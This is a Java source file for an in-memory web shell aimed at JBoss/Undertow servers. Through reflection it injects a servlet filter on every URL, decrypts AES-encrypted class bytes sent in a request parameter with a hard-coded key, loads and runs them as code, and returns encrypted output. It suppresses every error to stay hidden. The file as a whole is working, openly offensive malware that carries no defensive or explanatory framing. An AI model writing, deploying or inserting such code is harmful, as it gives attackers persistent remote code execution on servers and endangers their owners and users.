import javax.servlet.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.*;

public class AesBase64JBoosFilterShell extends ClassLoader implements Filter {
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private static Class payloadClass;
    private String key = "3c6e0b8a9c15224a";
    private String password = "pass";


    static {
        new AesBase64JBoosFilterShell();
    }

    public AesBase64JBoosFilterShell(ClassLoader loader) {
        super(loader);
    }

    public AesBase64JBoosFilterShell() {
        synchronized (lock) {
            if (!initialized) {
                initialized = true;
                try {
                    addFilter(AesBase64JBoosFilterShell.class);
                } catch (Throwable e) {

                }
            }
        }
    }

    private static Object[] getContexts() throws Throwable {
        HashSet contexts = new HashSet();
        Object servletRequestContext = loadClassEx("io.undertow.servlet.handlers.ServletRequestContext").getMethod("current").invoke(null);
        Object currentServletContext = servletRequestContext.getClass().getMethod("getCurrentServletContext").invoke(servletRequestContext);
        contexts.add(currentServletContext);
        return contexts.toArray();
    }

    private boolean addFilter(Class filterClass) throws Throwable {
        boolean isOk = false;
        try {
            Object[] obj = getContexts();
            for (int i = 0; i < obj.length; i++) {
                Object currentServletContext = obj[i];
                try {
                    Class filterInfoClass = loadClassEx("io.undertow.servlet.api.FilterInfo");
                    Object deploymentInfo = getFieldValue(currentServletContext, "deploymentInfo");
                    Class targetFilter = filterClass;
                    Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(targetFilter.getName(), targetFilter);
                    deploymentInfo.getClass().getMethod("addFilter", filterInfoClass).invoke(deploymentInfo, filterInfo);
                    Object deploymentImpl = getFieldValue(currentServletContext, "deployment");
                    Object managedFilters = deploymentImpl.getClass().getMethod("getFilters").invoke(deploymentImpl);
                    managedFilters.getClass().getMethod("addFilter", filterInfoClass).invoke(managedFilters, filterInfo);
                    deploymentInfo.getClass().getMethod("insertFilterUrlMapping", int.class, String.class, String.class, DispatcherType.class).
                            invoke(deploymentInfo, 0, targetFilter.getName(), "/*", DispatcherType.REQUEST);
                    isOk = true;
                } catch (Throwable e) {

                }
            }
        } catch (Throwable e) {

        }


        return isOk;
    }

    private static Class loadClassEx(String className) throws ClassNotFoundException {
        try {
            return Class.forName(className);
        } catch (Throwable e) {
            try {
                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
            } catch (Throwable ignored) {
                try {
                    Thread[] threads = new Thread[Thread.activeCount()];
                    Thread.enumerate(threads);
                    for (int i = 0; i < threads.length; i++) {
                        Thread thread = threads[i];
                        if (thread == null) {
                            continue;
                        }
                        try {
                            ClassLoader loader = thread.getContextClassLoader();
                            return loader.loadClass(className);
                        } catch (Throwable ignored2) {

                        }

                    }

                } catch (Throwable ignored2) {

                }
            }

        }
        throw new ClassNotFoundException(className);
    }

    private static Field getField(Object obj, String fieldName) {
        Class clazz = null;

        if (obj == null) {
            return null;
        }

        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null) {
            field.setAccessible(true);
        }

        return field;
    }

    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }


    private byte[] aes(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    private static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    private static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{
                    byte[].class
            }).invoke(Encoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{
                        byte[].class
                }).invoke(Encoder, new Object[]{
                        bs
                });
            } catch (Exception e2) {
            }
        }
        return value;
    }

    private static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{
                    String.class
            }).invoke(decoder, new Object[]{
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{
                        String.class
                }).invoke(decoder, new Object[]{
                        bs
                });
            } catch (Exception e2) {
            }
        }
        return value;
    }


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String contentType = servletRequest.getContentType();
        try {
            if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
                String value = servletRequest.getParameter(password);
                if (value != null) {
                    byte[] data = base64Decode(value);
                    data = aes(data, false);
                    if (data != null && data.length > 0) {
                        if (payloadClass == null) {
                            ClassLoader loader = Thread.currentThread().getContextClassLoader();
                            if (loader == null) {
                                loader = servletRequest.getClass().getClassLoader();
                            }
                            payloadClass = new AesBase64JBoosFilterShell(loader).defineClass(data, 0, data.length);
                        } else {
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            Object f = payloadClass.newInstance();
                            f.equals(arrOut);
                            f.equals(servletRequest);
                            f.equals(data);
                            f.toString();
                            String md5 = md5(password + key);
                            if (arrOut.size() > 0) {
                                PrintWriter printWriter = servletResponse.getWriter();
                                printWriter.write(md5.substring(0, 16));
                                printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                printWriter.write(md5.substring(16));
                                return;
                            }
                        }
                    }
                }
            }
        } catch (Throwable e) {

        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
